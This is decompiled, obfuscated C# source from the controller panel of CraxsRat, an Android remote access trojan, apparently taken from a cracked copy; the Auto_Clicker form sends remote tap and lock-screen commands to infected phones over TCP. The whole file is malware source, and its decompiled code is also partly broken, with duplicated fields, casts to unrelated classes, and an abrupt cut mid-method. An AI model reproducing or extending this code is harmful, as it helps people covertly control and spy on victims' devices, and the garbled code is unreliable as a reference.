// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Auto_Clicker
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class Auto_Clicker : Form
  {
    public string \u0024VB\u0024Local_result;
    public Apk_studio \u0024VB\u0024Me;
    public string \u0024VB\u0024Local_result;
    public Apk_studio \u0024VB\u0024Me;
    public DialogResult \u0024VB\u0024Local_dialogResult;
    public SaveFileDialog \u0024VB\u0024Local_saveDialog;
    public Apk_studio \u0024VB\u0024Me;
    public string \u0024VB\u0024Local_result;
    public Apk_studio._Closure\u0024__124\u002D0 \u0024VB\u0024NonLocal_\u0024VB\u0024Closure_2;
    public DialogResult \u0024VB\u0024Local_dialogResult;
    public SaveFileDialog \u0024VB\u0024Local_saveDialog;
    public Apk_studio \u0024VB\u0024Me;
    public string \u0024VB\u0024Local_fileName;
    public Apk_studio._Closure\u0024__125\u002D0 \u0024VB\u0024NonLocal_\u0024VB\u0024Closure_2;
    private IContainer components;

    internal virtual Panel Panel1
    {
      get => ((Calls_Records) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Calls_Records) this)._Panel1 = value;
    }

    internal virtual Label statustext
    {
      get => ((Calls_Records) this)._statustext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Calls_Records) this)._statustext = value;
      }
    }

    internal virtual Panel Panel2
    {
      get => ((Calls_Records) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Calls_Records) this)._Panel2 = value;
    }

    internal virtual Panel Panel3
    {
      get => ((Calls_Records) this)._Panel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Panel3_MouseClick);
        Panel panel3 = ((Calls_Records) this)._Panel3;
label_1:
        int num1 = -1836107532;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~num1 ^ ~(343799333 * -(696522849 - 511034608)) ^ ~(370819451 - (22533430 - -1180503128)) ^ 247500313 - -238308765 - --1663740045 ^ -348743813 * -695871866)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              panel3 = ((Calls_Records) this)._Panel3;
              num1 = (int) num2 * 431872224 ^ 2120277021;
              continue;
            case 2:
              goto label_3;
            case 3:
              panel3.MouseClick += mouseEventHandler;
              num1 = (int) num2 * 1930394067 ^ 1958959473;
              continue;
            case 4:
              ((Calls_Records) this)._Panel3 = value;
              num1 = -1397253253;
              continue;
            case 5:
              panel3.MouseClick -= mouseEventHandler;
              num1 = (int) num2 * -176914925 ^ 1329244321;
              continue;
            case 6:
              int num3 = panel3 == null ? 1864882894 : (num3 = 861245799);
              num1 = num3 ^ (int) num2 * 257686724;
              continue;
            case 7:
              int num4 = panel3 == null ? 1170183183 : (num4 = 379686134);
              num1 = num4 ^ (int) num2 * -1654540727;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label Label1
    {
      get => ((Calls_Records) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Calls_Records) this)._Label1 = value;
    }

    internal virtual DrakeUIComboBox selectedrecord
    {
      get => ((Calls_Records) this)._selectedrecord;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Calls_Records) this)._selectedrecord = value;
      }
    }

    public virtual DrakeUIAvatar refreshbtn
    {
      get => ((Calls_Records) this)._refreshbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwnmydf);
label_1:
        int num1 = 791916565;
        DrakeUIAvatar refreshbtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((num1 - ~((1137570169 - 2055767389 ^ 2035402937 ^ -380546091) + (1788829290 + 1766936118 + -696074450) - (-1573487939 * 827124344 + 756530239 * -657662966 - -1651661247 * -1989469451)) + -2111546555 * --(810573091 - 521855825) ^ -369646333) - (267385382 ^ 382423946 - 2060660407) ^ ~540354407)) % 7U)
          {
            case 0:
              refreshbtn.Click += eventHandler;
              num1 = (int) num2 * -1699914878 ^ -135801963;
              continue;
            case 1:
              refreshbtn = ((Calls_Records) this)._refreshbtn;
              num1 = (int) num2 * 1914328431 ^ 1734154449;
              continue;
            case 2:
              goto label_3;
            case 3:
              refreshbtn.Click -= eventHandler;
              num1 = (int) num2 * -1273568589 ^ 208495785;
              continue;
            case 4:
              goto label_1;
            case 5:
              ((Calls_Records) this)._refreshbtn = value;
              refreshbtn = ((Calls_Records) this)._refreshbtn;
              int num3;
              num1 = num3 = refreshbtn == null ? 991188551 : (num3 = -369953216);
              continue;
            case 6:
              int num4 = refreshbtn == null ? -1338954971 : (num4 = 1748173555);
              num1 = num4 ^ (int) num2 * -1676162279;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
    {
      get => ((Calls_Records) this)._DrakeUIButtonIcon1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsgdfer);
label_1:
        int num1 = 1014232574;
        DrakeUIButtonIcon drakeUiButtonIcon1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -~((~num1 - -399926189 * (-408509773 - (49615675 + 1026768347) + (-499203942 - 1290906823) * -1303909511)) * -2079840817 - ~(1414152353 * -317009517))) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              drakeUiButtonIcon1.Click -= eventHandler;
              num1 = (int) num2 * 71008654 ^ -1227406185;
              continue;
            case 2:
              drakeUiButtonIcon1 = ((Calls_Records) this)._DrakeUIButtonIcon1;
              int num3 = drakeUiButtonIcon1 == null ? 1509923755 : (num3 = -152180108);
              num1 = num3 ^ (int) num2 * 1473037048;
              continue;
            case 3:
              ((Calls_Records) this)._DrakeUIButtonIcon1 = value;
              drakeUiButtonIcon1 = ((Calls_Records) this)._DrakeUIButtonIcon1;
              num1 = 1030189876;
              continue;
            case 4:
              drakeUiButtonIcon1.Click += eventHandler;
              num1 = (int) num2 * -385522122 ^ -257083475;
              continue;
            case 5:
              int num4 = drakeUiButtonIcon1 == null ? -798623931 : (num4 = -1468526818);
              num1 = num4 ^ (int) num2 * 690423152;
              continue;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
    {
      get => ((Calls_Records) this)._DrakeUIButtonIcon2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdxzc);
label_1:
        int num1 = 160281879;
        DrakeUIButtonIcon drakeUiButtonIcon2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-(~num1 ^ ~(-1964003201 * -818233360) - 1053357359 ^ 313132277 * (903828695 * -871252599 * -1484493619)) ^ -1544891233 - -961662804 - ~-1776531811) - (-1036408687 - -1663001595) - 1534058522)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              drakeUiButtonIcon2.Click += eventHandler;
              num1 = (int) num2 * -877077153 ^ -312538956;
              continue;
            case 3:
              drakeUiButtonIcon2.Click -= eventHandler;
              num1 = (int) num2 * 62553563 ^ 1161343711;
              continue;
            case 4:
              drakeUiButtonIcon2 = ((Calls_Records) this)._DrakeUIButtonIcon2;
              int num3 = drakeUiButtonIcon2 == null ? -1608008722 : (num3 = -2054083776);
              num1 = num3 ^ (int) num2 * -440753587;
              continue;
            case 5:
              ((Calls_Records) this)._DrakeUIButtonIcon2 = value;
              drakeUiButtonIcon2 = ((Calls_Records) this)._DrakeUIButtonIcon2;
              int num4;
              num1 = num4 = drakeUiButtonIcon2 == null ? 566562556 : (num4 = 655887313);
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
    {
      get => ((CraxsAbout) this)._DrakeUIButtonIcon3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatstybgtdq);
label_1:
        int num1 = 1151644778;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUIButtonIcon drakeUiButtonIcon3;
          switch ((num3 = (uint) -((-((-5858707 ^ -840959751 * (-189833583 + (494730170 ^ 300845303)) ^ -(-379071319 + -1744634603 * 834398700) ^ -777035435 - -662893383 ^ -999522052 ^ 1205775757) - num2) ^ ~(939846026 - -1077554925) * -1143352275) + -(1782653207 - 1437757845))) % 6U)
          {
            case 0:
              drakeUiButtonIcon3.Click += eventHandler;
              num1 = (int) num3 * 1020895947 ^ -1963633957;
              continue;
            case 1:
              drakeUiButtonIcon3 = ((CraxsAbout) this)._DrakeUIButtonIcon3;
              int num4 = drakeUiButtonIcon3 == null ? -819328074 : (num4 = 908401848);
              num1 = num4 ^ (int) num3 * 1081088290;
              continue;
            case 2:
              goto label_1;
            case 3:
              drakeUiButtonIcon3.Click -= eventHandler;
              num1 = (int) num3 * 1638436959 ^ -1242382609;
              continue;
            case 4:
              goto label_3;
            case 5:
              ((CraxsAbout) this)._DrakeUIButtonIcon3 = value;
              drakeUiButtonIcon3 = ((CraxsAbout) this)._DrakeUIButtonIcon3;
              int num5;
              num1 = num5 = drakeUiButtonIcon3 == null ? -782889103 : (num5 = -5526335);
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
    {
      get => ((CraxsAbout) this)._DrakeUIButtonIcon4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon4_Click);
label_1:
        int num1 = -1557660231;
        DrakeUIButtonIcon drakeUiButtonIcon4;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((num1 * -1956211559 ^ 944676591 + -1610993048 ^ ~~(-483461005 - -686645685) ^ 1123545523 * ~-692277975) * -580667749)) % 9U)
          {
            case 0:
              goto label_1;
            case 1:
              drakeUiButtonIcon4 = ((CraxsAbout) this)._DrakeUIButtonIcon4;
              num1 = (int) num2 * -953345085 ^ -378095745;
              continue;
            case 2:
              ((CraxsAbout) this)._DrakeUIButtonIcon4 = value;
              num1 = 541025602;
              continue;
            case 3:
              int num3 = drakeUiButtonIcon4 == null ? 618500144 : (num3 = 1218936114);
              num1 = num3 ^ (int) num2 * 1987146048;
              continue;
            case 4:
              drakeUiButtonIcon4 = ((CraxsAbout) this)._DrakeUIButtonIcon4;
              num1 = (int) num2 * -1778993486 ^ -746544996;
              continue;
            case 5:
              drakeUiButtonIcon4.Click += eventHandler;
              num1 = (int) num2 * 655317423 ^ -794996683;
              continue;
            case 6:
              drakeUiButtonIcon4.Click -= eventHandler;
              num1 = (int) num2 * 1909771516 ^ -1157816024;
              continue;
            case 7:
              goto label_3;
            case 8:
              int num4 = drakeUiButtonIcon4 == null ? -1384133419 : (num4 = 599454032);
              num1 = num4 ^ (int) num2 * -1493955549;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon5
    {
      get => ((CraxsAbout) this)._DrakeUIButtonIcon5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdaswcdnb);
label_1:
        int num1 = 1706327494;
        DrakeUIButtonIcon drakeUiButtonIcon5;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(-(num1 * -1574321363) ^ (~1919264802 ^ -212828651 * -945702707) - -1305380724) + (-532013732 - 1400164650) ^ 2129864757)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              drakeUiButtonIcon5 = ((CraxsAbout) this)._DrakeUIButtonIcon5;
              num1 = (int) num2 * -884360923 ^ 1987604406;
              continue;
            case 2:
              ((CraxsAbout) this)._DrakeUIButtonIcon5 = value;
              num1 = -1791102238;
              continue;
            case 3:
              drakeUiButtonIcon5.Click += eventHandler;
              num1 = (int) num2 * -523398113 ^ -1263332664;
              continue;
            case 4:
              int num3 = drakeUiButtonIcon5 == null ? 758006849 : (num3 = -521818400);
              num1 = num3 ^ (int) num2 * 2020530563;
              continue;
            case 5:
              drakeUiButtonIcon5 = ((CraxsAbout) this)._DrakeUIButtonIcon5;
              int num4 = drakeUiButtonIcon5 == null ? -873473910 : (num4 = 1800357227);
              num1 = num4 ^ (int) num2 * -790170073;
              continue;
            case 6:
              goto label_3;
            case 7:
              drakeUiButtonIcon5.Click -= eventHandler;
              num1 = (int) num2 * 1551219397 ^ -1215260766;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual PictureBox clientimage
    {
      get => ((CraxsAbout) this)._clientimage;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsAbout) this)._clientimage = value;
    }

    public Auto_Clicker()
    {
label_1:
      int num1 = 818863934;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (1919311095 * (1503534312 * 1552653631) - 1197478213 - (num2 * 531822767 - (~1833999806 + ((121714329 ^ 1551580942 ^ 1503531945 ^ -2116402853) - --1862922338))) + -(17168287 - -1224925231))) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.Load += new EventHandler(this.Auto_Clicker_Load);
            this.FormClosing += new FormClosingEventHandler(this.Auto_Clicker_FormClosing);
            num1 = (int) num3 * -1492611017 ^ -1743166420;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      ((Apkinstaller) this).InitializeComponent();
    }

    public void DrawPoint(object[] obj)
    {
      if (!this.Panel3.InvokeRequired)
        goto label_7;
label_1:
      int num1 = -1317950939;
label_2:
      int integer1;
      int integer2;
      int integer3;
      int integer4;
      Graphics graphics;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~num1 - 1809908471 * ((1917896552 + 873058238 - (-1897541980 ^ 355770833)) * 502411541) + ((-368382987 ^ -178337969) - --1402751682 + (~-1744471839 - -341336279)))) % 8U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_7;
          case 2:
            integer2 = Conversions.ToInteger(obj[2]);
            integer3 = Conversions.ToInteger(obj[3]);
            num1 = (int) num2 * -809002422 ^ 1311990047;
            continue;
          case 3:
            goto label_3;
          case 4:
            // ISSUE: method pointer
            this.Panel3.Invoke((Delegate) new Auto_Clicker((object) this, __methodptr(DrawPoint)), (object) obj);
            num1 = (int) num2 * 573609048 ^ -868554482;
            continue;
          case 5:
            Pen pen = new Pen(Color.Red, 10f);
            Point point = new Point(checked ((int) Math.Round(unchecked ((double) integer4 * (double) this.Panel3.Width / (double) integer2))), checked ((int) Math.Round(unchecked ((double) integer1 * (double) this.Panel3.Height / (double) integer3))));
            graphics.DrawEllipse(pen, point.X, point.Y, 6, 6);
            num1 = (int) num2 * -1736206342 ^ 807873676;
            continue;
          case 6:
            graphics = this.Panel3.CreateGraphics();
            num1 = (int) num2 * 1190661703 ^ 1632939574;
            continue;
          case 7:
            integer1 = Conversions.ToInteger(obj[1]);
            num1 = (int) num2 * -1712003088 ^ -1180783801;
            continue;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:
      return;
label_7:
      integer4 = Conversions.ToInteger(obj[0]);
      num1 = -1205917278;
      goto label_2;
    }

    public void UpdateStatus(object[] obj)
    {
      if (!this.statustext.InvokeRequired)
        goto label_5;
label_1:
      int num1 = 679179398;
label_2:
      Auto_Clicker.updatedele method;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(~(-num1 * 1606966935 ^ ~1799353913) * 99375581)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 821758079 ^ 1702374168;
            continue;
          case 2:
            goto label_5;
          case 3:
            goto label_3;
          case 4:
            method = (Auto_Clicker.updatedele) new Auto_Clicker.Drawdele(this.UpdateStatus);
            num1 = (int) num2 * -311377742 ^ -174194103;
            continue;
          case 5:
            this.statustext.Invoke((Delegate) method, (object) obj);
            num1 = (int) num2 * -671063153 ^ 513224604;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_5:
      this.statustext.Text = Conversions.ToString(obj[0]);
      num1 = 885074693;
      goto label_2;
    }

    public void AddRecords(object[] obj)
    {
      if (!this.selectedrecord.InvokeRequired)
        goto label_4;
label_1:
      int num1 = -826969368;
label_2:
      string[] strArray;
      while (true)
      {
        int num2 = num1;
        uint num3;
        int index;
        switch ((num3 = (uint) ((349435495 - 1611324356 + -1856421837 * 805707583 ^ 1823438868 - 1185233425 + (-2043588785 ^ 1797152783)) - (-num2 ^ ~(462938310 - 98254905 - (609293828 + 1111841626)) - ((-1883714286 - 1211332467 ^ 1722930435 - 68801719) + --259550677 * 1087270429)))) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            goto label_4;
          case 3:
            index = 0;
            num1 = (int) num3 * -1545408066 ^ 498019678;
            continue;
          case 5:
            if (index < strArray.Length)
            {
              num1 = 751285185;
              continue;
            }
            goto label_12;
          default:
            string str = strArray[index];
            try
            {
              if (!this.selectedrecord.Items.Contains((object) str))
              {
label_10:
                int num4 = -591484034;
                while (true)
                {
                  int num5 = num4;
                  uint num6;
                  switch ((num6 = (uint) ((349435495 - 1611324356 + -1856421837 * 805707583 ^ 1823438868 - 1185233425 + (-2043588785 ^ 1797152783)) - (-num5 ^ ~(462938310 - 98254905 - (609293828 + 1111841626)) - ((-1883714286 - 1211332467 ^ 1722930435 - 68801719) + --259550677 * 1087270429)))) % 3U)
                  {
                    case 1:
                      this.selectedrecord.Items.Add((object) str);
                      this.selectedrecord.Text = str;
                      this.selectedrecord.Refresh();
                      num4 = (int) num6 * 651416949 ^ -737342513;
                      continue;
                    case 2:
                      goto label_10;
                    default:
                      goto label_15;
                  }
                }
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
label_15:
            checked { ++index; }
            goto case 5;
        }
      }
label_3:
      this.selectedrecord.Invoke((Delegate) new Auto_Clicker.updatedele(this.AddRecords), (object) obj);
      return;
label_12:
      return;
label_4:
      strArray = (string[]) obj[0];
      num1 = 256958232;
      goto label_2;
    }

    private void Panel3_MouseClick(object sender, MouseEventArgs e)
    {
    }

    private void Button1_Click_1(object sender, EventArgs e)
    {
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwnmydf(object sender, EventArgs e)
    {
      if (((CraxsAbout) this).Classclient == null)
        return;
label_1:
      int num1 = 1321702006;
      object[] ParametersObjects;
      TcpClient client;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 - -708302857 * (~-(1163192082 + 1067527593) + (-232948882 - 997639459 ^ ~-1868960391 ^ -2124243199 * 148239323)) + -1292491941 * --(-2047089412 ^ 295683716) ^ -~-1545110690 ^ ~(1852966711 ^ -363219970))) % 5U)
        {
          case 0:
            string[] strArray = ((Data) ((CraxsAbout) this).Classclient).Keys.Split(':');
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00336620759 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((CraxsAbout) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0036906720E),
              (object) ((CraxsAbout) this).Classclient
            };
            num1 = (int) num2 * -2070309864 ^ -1824738189;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((CraxsAbout) this).Classclient).myClient;
            num1 = (int) num2 * 1849884580 ^ -149292938;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_7;
          case 4:
            ((CraxsAbout) this).Classclient.SendMessage(ParametersObjects);
            num1 = (int) num2 * -469053381 ^ -2049728584;
            continue;
          default:
            goto label_8;
        }
      }
label_7:
      return;
label_8:;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsgdfer(object sender, EventArgs e)
    {
      if (((CraxsAbout) this).Classclient == null)
        return;
label_1:
      int num1 = 892525347;
      TcpClient client;
      string[] strArray;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~~(~num1 - ((1789248956 ^ 1818484830) + (-225274389 - -1132057539) ^ -279789690) * 530876867 - (990288246 + -(-106314117 - 1650395147))) ^ -749390374)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_6;
          case 2:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((CraxsAbout) this).Classclient).myClient;
            strArray = ((Data) ((CraxsAbout) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * -1474506900 ^ -1428417802;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((CraxsAbout) this).Classclient.SendMessage(new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00339666A09 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((CraxsAbout) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003180E0B09),
              (object) ((CraxsAbout) this).Classclient
            });
            num1 = (int) num2 * -874309656 ^ 402703208;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdxzc(object sender, EventArgs e)
    {
      if (((CraxsAbout) this).Classclient == null)
        return;
label_1:
      int num1 = 962140582;
      TcpClient client;
      string[] strArray;
      object[] ParametersObjects;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(~(-~num1 + (-(-246001168 ^ -900587341) - (-1741094501 - 145232300))) * 445231885)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031B6E4A4D + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((CraxsAbout) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0031D710859),
              (object) ((CraxsAbout) this).Classclient
            };
            num1 = (int) num2 * 250873910 ^ -1362117763;
            continue;
          case 2:
            ((CraxsAbout) this).Classclient.SendMessage(ParametersObjects);
            num1 = (int) num2 * 323897016 ^ -135009132;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((CraxsAbout) this).Classclient).myClient;
            strArray = ((Data) ((CraxsAbout) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * 1673250948 ^ 608862313;
            continue;
          case 4:
            goto label_7;
          default:
            goto label_8;
        }
      }
label_7:
      return;
label_8:;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatstybgtdq(object sender, EventArgs e)
    {
      if (((CraxsAbout) this).Classclient == null)
        return;
label_1:
      int num1 = -375056368;
      while (true)
      {
        int num2 = num1;
        uint num3;
        Dialog1 dialog1;
        object[] ParametersObjects;
        TcpClient client;
        switch ((num3 = (uint) (384115291 + 187216904 - ~-(-num2 - ~(-71682584 * 223033621 - (1366777110 - 1005489875 + (-298508447 - -1118334553)))) ^ -674361385)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            string[] strArray = ((Data) ((CraxsAbout) this).Classclient).Keys.Split(':');
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0030027704B + ((Drooper) dialog1).TheText + EXGuarder.\u0031E1E722F + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((CraxsAbout) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00304541B2B),
              (object) ((CraxsAbout) this).Classclient
            };
            num1 = (int) num3 * -1524649877 ^ 1971447737;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((CraxsAbout) this).Classclient).myClient;
            dialog1 = (Dialog1) new CraxsSettings();
            ((Drooper) dialog1).Title = EXGuarder.\u003573C4442;
            num1 = (int) num3 * 989332531 ^ -897010861;
            continue;
          case 3:
            ((CraxsAbout) this).Classclient.SendMessage(ParametersObjects);
            num1 = (int) num3 * 321337916 ^ 1283108999;
            continue;
          case 4:
            int num4 = (int) dialog1.ShowDialog();
            num1 = (int) num3 * -925418237 ^ 793862419;
            continue;
          case 5:
            int num5 = dialog1.DialogResult != DialogResult.OK ? 2073790017 : (num5 = -1534771478);
            num1 = num5 ^ (int) num3 * -508651218;
            continue;
          case 6:
            goto label_9;
          default:
            goto label_10;
        }
      }
label_9:
      return;
label_10:;
    }

    private void DrakeUIButtonIcon4_Click(object sender, EventArgs e) => this.Panel3.Invalidate();

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdaswcdnb(object sender, EventArgs e)
    {
      if (!(string.IsNullOrEmpty(this.selectedrecord.Text) | string.IsNullOrWhiteSpace(this.selectedrecord.Text)))
        goto label_5;
label_1:
      int num1 = 1667721983;
label_2:
      object[] ParametersObjects;
      TcpClient client;
      string[] strArray;
      while (true)
      {
        uint num2;
